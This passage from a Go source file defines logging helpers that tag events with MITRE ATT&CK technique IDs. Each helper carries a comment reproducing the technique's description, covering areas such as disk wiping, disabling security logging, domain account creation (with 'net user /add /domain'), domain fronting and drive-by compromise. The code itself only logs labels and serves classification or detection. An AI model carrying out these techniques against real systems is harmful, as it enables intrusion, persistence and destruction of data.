Cryptography with Web Protocols) or even enabling Man-in-the-Middle if added to
the root of trust (i.e. Install Root Certificate). After creating a digital
certificate, an adversary may then install that certificate (see Install Digital
Certificate) on infrastructure under their control.
*/
func (g *Session) ATTACKEntDigitalCertificates(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1587.003").
        Msg("digital certificates")
}

/* ATTACKEntDigitalCertificates2 Phases: resource-development

Adversaries may buy and/or steal SSL/TLS certificates that can be used during
targeting. SSL/TLS certificates are designed to instill trust. They include
information about the key, information about its owner's identity, and the
digital signature of an entity that has verified the certificate's contents are
correct. If the signature is valid, and the person examining the certificate
trusts the signer, then they know they can use that key to communicate with its
owner. Adversaries may purchase or steal SSL/TLS certificates to further their
operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web
Protocols) or even enabling Man-in-the-Middle if the certificate is trusted or
otherwise added to the root of trust (i.e. Install Root Certificate). The
purchase of digital certificates may be done using a front organization or using
information stolen from a previously compromised entity that allows the
adversary to validate to a certificate provider as that entity. Adversaries may
also steal certificate materials directly from a compromised third-party,
including from certificate authorities.(Citation: DiginotarCompromise)
Adversaries may register or hijack domains that they will later purchase an
SSL/TLS certificate for. Certificate authorities exist that allow adversaries to
acquire SSL/TLS certificates, such as domain validation certificates, for
free.(Citation: Let's Encrypt FAQ) After obtaining a digital certificate, an
adversary may then install that certificate (see Install Digital Certificate) on
infrastructure under their control.
*/
func (g *Session) ATTACKEntDigitalCertificates2(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1588.004").
        Msg("digital certificates")
}

/* ATTACKEntDigitalCertificates3 Phases: reconnaissance

Adversaries may search public digital certificate data for information about
victims that can be used during targeting. Digital certificates are issued by a
certificate authority (CA) in order to cryptographically verify the origin of
signed content. These certificates, such as those used for encrypted web traffic
(HTTPS SSL/TLS communications), contain information about the registered
organization such as name and location. Adversaries may search digital
certificate data to gather actionable information. Threat actors can use online
resources and lookup tools to harvest information about certificates.(Citation:
SSLShopper Lookup) Digital certificate data may also be available from artifacts
signed by the organization (ex: certificates used from encrypted web traffic are
served with content).(Citation: Medium SSL Cert) Information from these sources
may reveal opportunities for other forms of reconnaissance (ex: Active Scanning
or Phishing for Information), establishing operational resources (ex: Develop
Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote
Services or Trusted Relationship).
*/
func (g *Session) ATTACKEntDigitalCertificates3(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1596.003").
        Msg("digital certificates")
}

/* ATTACKEntDirectNetworkFlood Phases: impact

Adversaries may attempt to cause a denial of service (DoS) by directly sending a
high-volume of network traffic to a target. Direct Network Flood are when one or
more systems are used to send a high-volume of network packets towards the
targeted service's network. Almost any network protocol may be used for
flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful
protocols such as TCP can be used as well. Botnets are commonly used to conduct
network flooding attacks against networks and services. Large botnets can
generate a significant amount of traffic from systems spread across the global
Internet. Adversaries may have the resources to build out and control their own
botnet infrastructure or may rent time on an existing botnet to conduct an
attack. In some of the worst cases for distributed DoS (DDoS), so many systems
are used to generate the flood that each one only needs to send out a small
amount of traffic to produce enough volume to saturate the target network. In
such circumstances, distinguishing DDoS traffic from legitimate clients becomes
exceedingly difficult. Botnets have been used in some of the most high-profile
DDoS flooding attacks, such as the 2012 series of incidents that targeted major
US banks.(Citation: USNYAG IranianBotnet March 2016)
*/
func (g *Session) ATTACKEntDirectNetworkFlood(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1498.001").
        Msg("direct network flood")
}

/* ATTACKEntDirectVolumeAccess Phases: defense-evasion

Adversaries may directly access a volume to bypass file access controls and file
system monitoring. Windows allows programs to have direct access to logical
volumes. Programs with direct access may read and write files directly from the
drive by analyzing file system data structures. This technique bypasses Windows
file access controls as well as file system monitoring tools. (Citation:
Hakobyan 2009) Utilities, such as NinjaCopy, exist to perform these actions in
PowerShell. (Citation: Github PowerSploit Ninjacopy)
*/
func (g *Session) ATTACKEntDirectVolumeAccess(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1006").
        Msg("direct volume access")
}

/* ATTACKEntDisableCloudLogs Phases: defense-evasion

An adversary may disable cloud logging capabilities and integrations to limit
what data is collected on their activities and avoid detection.  Cloud
environments allow for collection and analysis of audit and application logs
that provide insight into what activities a user does within the environment. If
an attacker has sufficient permissions, they can disable logging to avoid
detection of their activities. For example, in AWS an adversary may disable
CloudWatch/CloudTrail integrations prior to conducting further malicious
activity.(Citation: Following the CloudTrail: Generating strong AWS security
signals with Sumo Logic)
*/
func (g *Session) ATTACKEntDisableCloudLogs(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1562.008").
        Msg("disable cloud logs")
}

/* ATTACKEntDisableCryptoHardware Phases: defense-evasion

Adversaries disable a network device’s dedicated hardware encryption, which may
enable them to leverage weaknesses in software encryption in order to reduce the
effort involved in collecting, manipulating, and exfiltrating transmitted data.
Many network devices such as routers, switches, and firewalls, perform
encryption on network traffic to secure transmission across networks. Often,
these devices are equipped with special, dedicated encryption hardware to
greatly increase the speed of the encryption process as well as to prevent
malicious tampering. When an adversary takes control of such a device, they may
disable the dedicated hardware, for example, through use of Modify System Image,
forcing the use of software to perform encryption on general processors. This is
typically used in conjunction with attacks to weaken the strength of the cipher
in software (e.g., Reduce Key Space). (Citation: Cisco Blog Legacy Device
Attacks)
*/
func (g *Session) ATTACKEntDisableCryptoHardware(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1600.002").
        Msg("disable crypto hardware")
}

/* ATTACKEntDisableWindowsEventLogging Phases: defense-evasion

Adversaries may disable Windows event logging to limit data that can be
leveraged for detections and audits. Windows event logs record user and system
activity such as login attempts, process creation, and much more.(Citation:
Windows Log Events) This data is used by security tools and analysts to generate
detections. Adversaries may targeting system-wide logging or just that of a
particular application. By disabling Windows event logging, adversaries can
operate while leaving less evidence of a compromise behind.
*/
func (g *Session) ATTACKEntDisableWindowsEventLogging(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1562.002").
        Msg("disable windows event logging")
}

/* ATTACKEntDisableorModifyCloudFirewall Phases: defense-evasion

Adversaries may disable or modify a firewall within a cloud environment to
bypass controls that limit access to cloud resources. Cloud firewalls are
separate from system firewalls that are described in Disable or Modify System
Firewall.  Cloud environments typically utilize restrictive security groups and
firewall rules that only allow network activity from trusted IP addresses via
expected ports and protocols. An adversary may introduce new firewall rules or
policies to allow access into a victim cloud environment. For example, an
adversary may use a script or utility that creates new ingress rules in existing
security groups to allow any TCP/IP connectivity.(Citation: Expel IO Evil in
AWS) Modifying or disabling a cloud firewall may enable adversary C2
communications, lateral movement, and/or data exfiltration that would otherwise
not be allowed.
*/
func (g *Session) ATTACKEntDisableorModifyCloudFirewall(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1562.007").
        Msg("disable or modify cloud firewall")
}

/* ATTACKEntDisableorModifySystemFirewall Phases: defense-evasion

Adversaries may disable or modify system firewalls in order to bypass controls
limiting network usage. Changes could be disabling the entire mechanism as well
as adding, deleting, or modifying particular rules. This can be done numerous
ways depending on the operating system, including via command-line, editing
Windows Registry keys, and Windows Control Panel. Modifying or disabling a
system firewall may enable adversary C2 communications, lateral movement, and/or
data exfiltration that would otherwise not be allowed.
*/
func (g *Session) ATTACKEntDisableorModifySystemFirewall(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1562.004").
        Msg("disable or modify system firewall")
}

/* ATTACKEntDisableorModifyTools Phases: defense-evasion

Adversaries may disable security tools to avoid possible detection of their
tools and activities. This can take the form of killing security software or
event logging processes, deleting Registry keys so that tools do not start at
run time, or other methods to interfere with security tools scanning or
reporting information.
*/
func (g *Session) ATTACKEntDisableorModifyTools(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1562.001").
        Msg("disable or modify tools")
}

/* ATTACKEntDiskContentWipe Phases: impact

Adversaries may erase the contents of storage devices on specific systems or in
large numbers in a network to interrupt availability to system and network
resources. Adversaries may partially or completely overwrite the contents of a
storage device rendering the data irrecoverable through the storage
interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster
Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific
disk structures or files, adversaries with destructive intent may wipe arbitrary
portions of disk content. To wipe disk content, adversaries may acquire direct
access to the hard drive in order to overwrite arbitrarily sized portions of
disk with random data.(Citation: Novetta Blockbuster Destructive Malware)
Adversaries have been observed leveraging third-party drivers like RawDisk to
directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta
Blockbuster Destructive Malware) This behavior is distinct from Data Destruction
because sections of the disk are erased instead of individual files. To maximize
impact on the target organization in operations where network-wide availability
interruption is the goal, malware used for wiping disk content may have worm-
like features to propagate across a network by leveraging additional techniques
like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin
Shares.(Citation: Novetta Blockbuster Destructive Malware)
*/
func (g *Session) ATTACKEntDiskContentWipe(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1561.001").
        Msg("disk content wipe")
}

/* ATTACKEntDiskStructureWipe Phases: impact

Adversaries may corrupt or wipe the disk data structures on a hard drive
necessary to boot a system; targeting specific critical systems or in large
numbers in a network to interrupt availability to system and network resources.
Adversaries may attempt to render the system unable to boot by overwriting
critical data located in structures such as the master boot record (MBR) or
partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov
2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill
2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may
include the initial executable code for loading an operating system or the
location of the file system partitions on disk. If this information is not
present, the computer will not be able to load an operating system during the
boot process, leaving the computer unavailable. Disk Structure Wipe may be
performed in isolation, or along with Disk Content Wipe if all sectors of a disk
are wiped. To maximize impact on the target organization, malware designed for
destroying disk structures may have worm-like features to propagate across a
network by leveraging other techniques like Valid Accounts, OS Credential
Dumping, and SMB/Windows Admin Shares.(Citation: Symantec Shamoon
2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov
2016)(Citation: Kaspersky StoneDrill 2017)
*/
func (g *Session) ATTACKEntDiskStructureWipe(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1561.002").
        Msg("disk structure wipe")
}

/* ATTACKEntDiskWipe Phases: impact

Adversaries may wipe or corrupt raw disk data on specific systems or in large
numbers in a network to interrupt availability to system and network resources.
With direct write access to a disk, adversaries may attempt to overwrite
portions of disk data. Adversaries may opt to wipe arbitrary portions of disk
data and/or wipe disk structures like the master boot record (MBR). A complete
wipe of all disk sectors may be attempted. To maximize impact on the target
organization in operations where network-wide availability interruption is the
goal, malware used for wiping disks may have worm-like features to propagate
across a network by leveraging additional techniques like Valid Accounts, OS
Credential Dumping, and SMB/Windows Admin Shares.(Citation: Novetta Blockbuster
Destructive Malware)
*/
func (g *Session) ATTACKEntDiskWipe(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1561").
        Msg("disk wipe")
}

/* ATTACKEntDistributedComponentObjectModel Phases: lateral-movement

Adversaries may use Valid Accounts to interact with remote machines by taking
advantage of Distributed Component Object Model (DCOM). The adversary may then
perform actions as the logged-on user. The Windows Component Object Model (COM)
is a component of the native Windows application programming interface (API)
that enables interaction between software objects, or executable code that
implements one or more interfaces. Through COM, a client object can call methods
of server objects, which are typically Dynamic Link Libraries (DLL) or
executables (EXE). Distributed COM (DCOM) is transparent middleware that extends
the functionality of COM beyond a local computer using remote procedure call
(RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft
COM) Permissions to interact with local and remote server COM objects are
specified by access control lists (ACL) in the Registry.(Citation: Microsoft
Process Wide Com Keys) By default, only Administrators may remotely activate and
launch COM objects through DCOM.(Citation: Microsoft COM ACL) Through DCOM,
adversaries operating in the context of an appropriately privileged user can
remotely obtain arbitrary and even direct shellcode execution through Office
applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as
other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM
Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute
macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also
invoke Dynamic Data Exchange (DDE) execution directly through a COM created
instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE
Lateral Movement Nov 2017), bypassing the need for a malicious document.
*/
func (g *Session) ATTACKEntDistributedComponentObjectModel(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1021.003").
        Msg("distributed component object model")
}

/* ATTACKEntDomainAccount Phases: persistence

Adversaries may create a domain account to maintain access to victim systems.
Domain accounts are those managed by Active Directory Domain Services where
access and permissions are configured across systems and services that are part
of that domain. Domain accounts can cover user, administrator, and service
accounts. With a sufficient level of access, the net user /add /domain command
can be used to create a domain account. Such accounts may be used to establish
secondary credentialed access that do not require persistent remote access tools
to be deployed on the system.
*/
func (g *Session) ATTACKEntDomainAccount(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1136.002").
        Msg("domain account")
}

/* ATTACKEntDomainAccount2 Phases: discovery

Adversaries may attempt to get a listing of domain accounts. This information
can help adversaries determine which domain accounts exist to aid in follow-on
behavior. Commands such as net user /domain and net group /domain of the Net
utility, dscacheutil -q groupon macOS, and ldapsearch on Linux can list domain
users and groups.
*/
func (g *Session) ATTACKEntDomainAccount2(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1087.002").
        Msg("domain account")
}

/* ATTACKEntDomainAccounts Phases: defense-evasion persistence privilege-escalation initial-access

Adversaries may obtain and abuse credentials of a domain account as a means of
gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.
(Citation: TechNet Credential Theft) Domain accounts are those managed by Active
Directory Domain Services where access and permissions are configured across
systems and services that are part of that domain. Domain accounts can cover
users, administrators, and services.(Citation: Microsoft AD Accounts)
Adversaries may compromise domain accounts, some with a high level of
privileges, through various means such as OS Credential Dumping or password
reuse, allowing access to privileged resources of the domain.
*/
func (g *Session) ATTACKEntDomainAccounts(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1078.002").
        Msg("domain accounts")
}

/* ATTACKEntDomainControllerAuthentication Phases: credential-access defense-evasion persistence

Adversaries may patch the authentication process on a domain controller to
bypass the typical authentication mechanisms and enable access to accounts.
Malware may be used to inject false credentials into the authentication process
on a domain controller with the intent of creating a backdoor used to access any
user’s account and/or credentials (ex: Skeleton Key). Skeleton key works through
a patch on an enterprise domain controller authentication process (LSASS) with
credentials that adversaries may use to bypass the standard authentication
system. Once patched, an adversary can use the injected password to successfully
authenticate as any domain user account (until the the skeleton key is erased
from memory by a reboot of the domain controller). Authenticated access may
enable unfettered access to hosts and/or resources within single-factor
authentication environments.(Citation: Dell Skeleton)
*/
func (g *Session) ATTACKEntDomainControllerAuthentication(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1556.001").
        Msg("domain controller authentication")
}

/* ATTACKEntDomainFronting Phases: command-and-control

Adversaries may take advantage of routing schemes in Content Delivery Networks
(CDNs) and other services which host multiple domains to obfuscate the intended
destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation:
Fifield Blocking Resistent Communication through domain fronting 2015) Domain
fronting involves using different domain names in the SNI field of the TLS
header and the Host field of the HTTP header. If both domains are served from
the same CDN, then the CDN may route to the address specified in the HTTP header
after unwrapping the TLS header. A variation of the the technique, "domainless"
fronting, utilizes a SNI field that is left blank; this may allow the fronting
to work even when the CDN attempts to validate that the SNI and HTTP Host fields
match (if the blank SNI fields are ignored). For example, if domain-x and
domain-y are customers of the same CDN, it is possible to place domain-x in the
TLS header and domain-y in the HTTP header. Traffic will appear to be going to
domain-x, however the CDN may route it to domain-y.
*/
func (g *Session) ATTACKEntDomainFronting(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1090.004").
        Msg("domain fronting")
}

/* ATTACKEntDomainGenerationAlgorithms Phases: command-and-control

Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically
identify a destination domain for command and control traffic rather than
relying on a list of static IP addresses or domains. This has the advantage of
making it much harder for defenders block, track, or take over the command and
control channel, as there potentially could be thousands of domains that malware
can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation:
Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019) DGAs can take the form of
apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they
construct domain names by generating each letter. Alternatively, some DGAs
employ whole words as the unit by concatenating words together instead of
letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different
domain for each time period (hourly, daily, monthly, etc). Others incorporate a
seed value as well to make predicting future domains more difficult for
defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella
DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation) Adversaries
may use DGAs for the purpose of Fallback Channels. When contact is lost with the
primary command and control server malware may employ a DGA as a means to
reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation:
FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)
*/
func (g *Session) ATTACKEntDomainGenerationAlgorithms(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1568.002").
        Msg("domain generation algorithms")
}

/* ATTACKEntDomainGroups Phases: discovery

Adversaries may attempt to find domain-level groups and permission settings. The
knowledge of domain-level permission groups can help adversaries determine which
groups exist and which users belong to a particular group. Adversaries may use
this information to determine which users have elevated permissions, such as
domain administrators. Commands such as net group /domain of the Net utility,
dscacheutil -q group on macOS, and ldapsearch on Linux can list domain-level
groups.
*/
func (g *Session) ATTACKEntDomainGroups(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1069.002").
        Msg("domain groups")
}

/* ATTACKEntDomainPolicyModification Phases: defense-evasion privilege-escalation

Adversaries may modify the configuration settings of a domain to evade defenses
and/or escalate privileges in domain environments. Domains provide a centralized
means of managing how computer resources (ex: computers, user accounts) can act,
and interact with each other, on a network. The policy of the domain also
includes configuration settings that may apply between domains in a multi-
domain/forest environment. Modifications to domain settings may include altering
domain Group Policy Objects (GPOs) or changing trust settings for domains,
including federation trusts. With sufficient permissions, adversaries can modify
domain policy settings. Since domain configuration settings control many of the
interactions within the Active Directory (AD) environment, there are a great
number of potential attacks that can stem from this abuse. Examples of such
abuse include modifying GPOs to push a malicious Scheduled Task to computers
throughout the domain environment(Citation: ADSecurity GPO Persistence
2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)
or modifying domain trusts to include an adversary controlled domain where they
can control access tokens that will subsequently be accepted by victim domain
resources.(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber
Attacks) Adversaries can also change configuration settings within the AD
environment to implement a Rogue Domain Controller. Adversaries may temporarily
modify domain policy, carry out a malicious action(s), and then revert the
change to remove suspicious indicators.
*/
func (g *Session) ATTACKEntDomainPolicyModification(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1484").
        Msg("domain policy modification")
}

/* ATTACKEntDomainProperties Phases: reconnaissance

Adversaries may gather information about the victim's network domain(s) that can
be used during targeting. Information about domains and their properties may
include a variety of details, including what domain(s) the victim owns as well
as administrative data (ex: name, registrar, etc.) and more directly actionable
information such as contacts (email addresses and phone numbers), business
addresses, and name servers. Adversaries may gather this information in various
ways, such as direct collection actions via Active Scanning or Phishing for
Information. Information about victim domains and their properties may also be
exposed to adversaries via online or other accessible data sets (ex:
WHOIS).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS)
Gathering this information may reveal opportunities for other forms of
reconnaissance (ex: Search Open Technical Databases, Search Open
Websites/Domains, or Phishing for Information), establishing operational
resources (ex: Acquire Infrastructure or Compromise Infrastructure), and/or
initial access (ex: Phishing).
*/
func (g *Session) ATTACKEntDomainProperties(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1590.001").
        Msg("domain properties")
}

/* ATTACKEntDomainTrustDiscovery Phases: discovery

Adversaries may attempt to gather information on domain trust relationships that
may be used to identify lateral movement opportunities in Windows multi-
domain/forest environments. Domain trusts provide a mechanism for a domain to
allow access to resources based on the authentication procedures of another
domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted
domain to access resources in the trusting domain. The information discovered
may help the adversary conduct SID-History Injection, Pass the Ticket, and
Kerberoasting.(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y
Domain Trusts) Domain trusts can be enumerated using the
DSEnumerateDomainTrusts() Win32 API call, .NET methods, and LDAP.(Citation:
Harmj0y Domain Trusts) The Windows utility Nltest is known to be used by
adversaries to enumerate domain trusts.(Citation: Microsoft Operation
Wilysupply)
*/
func (g *Session) ATTACKEntDomainTrustDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1482").
        Msg("domain trust discovery")
}

/* ATTACKEntDomainTrustModification Phases: defense-evasion privilege-escalation

Adversaries may add new domain trusts or modify the properties of existing
domain trusts to evade defenses and/or elevate privileges. Domain trust details,
such as whether or not a domain is federated, allow authentication and
authorization properties to apply between domains for the purpose of accessing
shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects
may include accounts, credentials, and other authentication material applied to
servers, tokens, and domains. Manipulating the domain trusts may allow an
adversary to escalate privileges and/or evade defenses by modifying settings to
add objects which they control. For example, this may be used to forge SAML
Tokens, without the need to compromise the signing certificate to forge new
credentials. Instead, an adversary can manipulate domain trusts to add their own
signing certificate.
*/
func (g *Session) ATTACKEntDomainTrustModification(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1484.002").
        Msg("domain trust modification")
}

/* ATTACKEntDomains Phases: resource-development

Adversaries may purchase domains that can be used during targeting. Domain names
are the human readable names used to represent one or more IP addresses. They
can be purchased or, in some cases, acquired for free. Adversaries can use
purchased domains for a variety of purposes, including for Phishing, Drive-by
Compromise, and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries
may choose domains that are similar to legitimate domains, including through use
of homoglyphs or use of a different top-level domain (TLD).(Citation: FireEye
APT28)(Citation: PaypalScam) Typosquatting may be used to aid in delivery of
payloads via Drive-by Compromise. Adversaries can also use internationalized
domain names (IDNs) to create visually similar lookalike domains for use in
operations.(Citation: CISA IDN ST05-016) Domain registrars each maintain a
publicly viewable database that displays contact information for every
registered domain. Private WHOIS services display alternative information, such
as their own company data, rather than the owner of the domain. Adversaries may
use such private WHOIS services to obscure information about who owns a
purchased domain. Adversaries may further interrupt efforts to track their
infrastructure by using varied registration information and purchasing domains
with different domain registrars.(Citation: Mandiant APT1)
*/
func (g *Session) ATTACKEntDomains(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1583.001").
        Msg("domains")
}

/* ATTACKEntDomains2 Phases: resource-development

Adversaries may hijack domains and/or subdomains that can be used during
targeting. Domain registration hijacking is the act of changing the registration
of a domain name without the permission of the original registrant.(Citation:
ICANNDomainNameHijacking) An adversary may gain access to an email account for
the person listed as the owner of the domain. The adversary can then claim that
they forgot their password in order to make changes to the domain registration.
Other possibilities include social engineering a domain registration help desk
to gain access to an account or taking advantage of renewal process gaps.
Subdomain hijacking can occur when organizations have DNS entries that point to
non-existent or deprovisioned resources. In such cases, an adversary may take
control of a subdomain to conduct operations with the benefit of the trust
associated with that domain.(Citation: Microsoft Sub Takeover 2020)
*/
func (g *Session) ATTACKEntDomains2(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1584.001").
        Msg("domains")
}

/* ATTACKEntDowngradeSystemImage Phases: defense-evasion

Adversaries may install an older version of the operating system of a network
device to weaken security.  Older operating system versions on network devices
often have weaker encryption ciphers and, in general, fewer/less updated
defensive features. (Citation: Cisco Synful Knock Evolution) On embedded
devices, downgrading the version typically only requires replacing the operating
system file in storage.  With most embedded devices, this can be achieved by
downloading a copy of the desired version of the operating system file and
reconfiguring the device to boot from that file on next system restart.  The
adversary could then restart the device to implement the change immediately or
they could wait until the next time the system restarts. Downgrading the system
image to an older versions may allow an adversary to evade defenses by enabling
behaviors such as Weaken Encryption.  Downgrading of a system image can be done
on its own, or it can be used in conjunction with Patch System Image.
*/
func (g *Session) ATTACKEntDowngradeSystemImage(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1601.002").
        Msg("downgrade system image")
}

/* ATTACKEntDrivebyCompromise Phases: initial-access

Adversaries may gain access to a system through a user visiting a website over
the normal course of browsing. With this technique, the user's web browser is
typically targeted for exploitation, but adversaries may also use compromised
websites for non-exploitation behavior such as acquiring Application Access
Token. Multiple ways of delivering exploit code to a browser exist, including:
A legitimate website is compromised where adversaries have injected some form of
malicious code such as JavaScript, iFrames, and cross-site scripting. Malicious
ads are paid for and served through legitimate ad providers. Built-in web
application interfaces are leveraged for the insertion of any other kind of
object that can be used to display web content or contain a script that executes
on the visiting client (e.g. forum posts, comments, and other user controllable
web content).  Often the website used by an adversary is one visited by a
specific community, such as government, a particular industry, or region, where
the goal is to compromise a specific user or set of users based on a shared
interest. This kind of targeted attack is referred to a strategic web compromise
or watering hole attack. There are several known examples of this
occurring.(Citation: Shadowserver Strategic Web Compromise) Typical drive-by
compromise process:  A user visits a website that is used to host the adversary
controlled content. Scripts automatically execute, typically searching versions
of the browser and plugins for a potentially vulnerable version.  The user may
be required to assist in this process by enabling scripting or active website
components and ignoring warning dialog boxes.   Upon finding a vulnerable
version, exploit code is delivered to the browser. If exploitation is
successful, then it will give the adversary code execution on the user's system
unless other protections are in place. In some cases a second visit to the
website after the initial scan is required before exploit code is delivered.
Unlike Exploit Public-Facing Application, the focus of this technique is to
exploit software on a client endpoint upon visiting a website. This will
commonly give an adversary access to systems on the internal network instead of
external systems that may be in a DMZ. Adversaries may also use compromised
websites to deliver a user to a malicious application designed to Steal
Application Access Tokens, like OAuth tokens, to gain access to protected
applications and information. These malicious applications have been delivered
through popups on legitimate websites.(Citation: Volexity OceanLotus Nov 2017)
*/
func (g *Session) ATTACKEntDrivebyCompromise(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1189").
        Msg("drive-by compromise")
}

/* ATTACKEntDrivebyTarget Phases: resource-development

Adversaries may prepare an operational environment to infect systems that visit
a website over the normal course of browsing. Endpoint systems may be
compromised through browsing to adversary controlled sites, as in Drive-by
Compromise. In such cases, the user's web browser is typically targeted for
exploitation (often not requiring any extra user interaction once landing on the
site), but adversaries may also set up websites for non-exploitation behavior
such as Application Access Token. Prior to Drive-by Compromise, adversaries must
stage resources needed to deliver that exploit to users who browse to an
adversary controlled site. Drive-by content can be staged on adversary
controlled infrastructure that has been acquired (Acquire Infrastructure) or
previously compromised (Compromise Infrastructure). Adversaries may upload or
inject malicious web content, such as JavaScript, into websites.(Citation:
FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015) This may be done in a
number of ways, including inserting malicious script into web pages or other
user controllable web content such as forum posts. Adversaries may also craft
malicious web advertisements and purchase ad space on a website through
legitimate ad providers. In addition to staging content to exploit a user's web
browser, adversaries may also stage scripting content to profile the user's
browser (as in Gather Victim Host Information) to ensure it is vulnerable prior
to attempting exploitation.(Citation: ATT ScanBox) Websites compromised by an
adversary and used to stage a drive-by may be ones visited by a specific
community, such as government, a particular industry, or region, where the goal
is to compromise a specific user or set of users based on a shared interest.
This kind of targeted attack is referred to a strategic web compromise or
watering hole attack. Adversaries may purchase domains similar to legitimate
domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during
acquisition of infrastructure (Domains) to help facilitate Drive-by Compromise.
*/
func (g *Session) ATTACKEntDrivebyTarget(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1608.004").
        Msg("drive-by target")
}

/* ATTACKEntDylibHijacking Phases: persistence privilege-escalation defense-evasion

Adversaries may execute their own payloads by placing a malicious dynamic
library (dylib) with an expected name in a path a victim application searches at
runtime. The dynamic loader will try to find the dylibs based on the sequential
order of the search paths. Paths to dylibs may be prefixed with @rpath, which
allows developers to use relative paths to specify an array of search paths used
at runtime based on the location of the executable.  Additionally, if weak
linking is used, such as the LC_LOAD_WEAK_DYLIB function, an application will
still execute even if an expected dylib is not present. Weak linking enables
developers to run an application on multiple macOS versions as new APIs are
added. Adversaries may gain execution by inserting malicious dylibs with the
name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack
Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github
EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker
Dylib) Dylibs are loaded into an application's address space allowing the
malicious dylib to inherit the application's privilege level and resources.
Based on the application, this could result in privilege escalation and
uninhibited network access. This method may also evade detection from security
products since the execution is masked under a legitimate process.(Citation:
Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation:
MalwareUnicorn macOS Dylib Injection MachO)
*/
func (g *Session) ATTACKEntDylibHijacking(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1574.004").
        Msg("dylib hijacking")
}

/* ATTACKEntDynamicDataExchange Phases: execution

Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary
commands. DDE is a client-server protocol for one-time and/or continuous inter-
process communication (IPC) between applications. Once a link is established,
applications can autonomously exchange transactions consisting of strings, warm
data links (notifications when a data item changes), hot data links
(duplications of changes to a data item), and requests for command execution.
Object Linking and Embedding (OLE), or the ability to link data between
documents, was originally implemented through DDE. Despite being superseded by
Component Object Model, DDE may be enabled in Windows 10 and most of Microsoft
Office 2016 via Registry keys. (Citation: BleepingComputer DDE Disabled in Word
